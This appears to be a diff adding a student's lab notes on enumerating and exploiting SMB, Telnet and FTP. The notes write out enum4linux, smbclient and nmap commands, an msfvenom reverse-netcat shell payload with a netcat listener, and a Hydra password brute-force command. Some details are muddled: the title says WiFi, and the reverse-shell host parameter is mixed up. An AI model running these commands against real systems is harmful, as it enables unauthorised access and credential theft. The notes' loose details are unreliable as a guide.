@@ -1,0 +1,82 @@
+***WIFI HACKING 101***
+Common Network service vuln and misconfigs
+
+SMB: server message block protocol: client-server communicaiton protocol used for sharing access to files, printers, serial ports and other resources on a network.
+Response-Request protocol. multiple messages b/n client and server to establish a connection. connect using TCP/IP.
+
+Enumerating SMB:
+-Enumeration: process of gathering information on a target in order to find potential attack vectors and aid in exploitation. (Find useful exploits that don't waste time and energy or break the system). 
+-SMB share drives can be connected to and used to view or transfer files (great starting point for discovery).
+-Port Scanning - find info about services, apps, structure and OS of target machine (Nmap)
+-Enum4Linux - tool used to enumerate SMB shares. "enum4linux [options] ip"
+-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+-a             all of the above (full basic enumeration)
+SMB uses 139/445 ports
+
+Exploiting SMB:
+***CVE-2017-7494***
+Best way into a system is due to misconfigurations in the system
+--Exploit anonymous SMB share access - leads to a shell
+SMBClient to access resources on servers
+
+What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
+smbclient //10.10.10.2/secret -U suit
+
+Telnet
+-application protocol that allows connection and execution of commands on remote machines hosting a telnet server
+-sends all messages in clear text (no specific security mechanisms) -- replaced by ssh
+-syntax: "telnet[ip][port]"
+
+Enumerating Telnet
+Enumeration >> port scan >> output
+Exploiting a Telnet
+CVE - common vulnerabilities and exposures
+
+Reverse Shell 
+A shell - piece of code or program used to gain code or command execution on a device
+reverse shell - target machine communicates back to the attacking machine on listening port 
+eg telnet [remote IP] [port]
+create a tcpdump on local machine: sudo tcpdump ip proto \\icmp -i eth0
+ping from remote to local machine: .RUN ping [local IP] -c 1
+run a revese shell from local machine: msfvenom -p cmd/unix/reverse_netcat lhost=[remote IP] lport=[listening port] R
+start a netcat listener on local machine: nc -lvp [listening port]
+
+FTP
+File Transfer Protocol: allows remote transfer of files over a network
+client-server model. 
+operates over two channels: 1. command(control) 2. data
+server vaidates login credentials and opens session. Client executes FTP commands on server.
+Active FTP connection: client opens a port and listens, server is required to actively connect to it.
+Passive FTP connection: server opens a port and listens passively and client connects to it
+Standard FTP port: 21
+
+Enumerating FTP
+1. port scan: nmap -sV -oN nmap-[targetIP].out [targetIP]
+2. see which ports are open: cat nmap-[targetIP].out | grep open
+3. ftp [targetIP]
+
+Exploiting FTP
+-FTP command and data channels are unencrypted (any data can be intercepted and read)
+-default pw configurations
+
+Brute Force Password
+Hydra: fast online password cracking tool against 50 protocols including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB and several others.
+command: "hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
+hydra: runs hydra tool
+-t 4: number of parallel connections per target
+-l [user]: points to the user account to compromise
+-P [path to dictionary]: points to file containing a list of possible passwords
+-vV: very verbose, show login and pw combination for each attempt
+[target IP]: target machine
+ftp: protocol
+
+ftp [targetIP]
+[user]
+[pw]
+ 
+ 
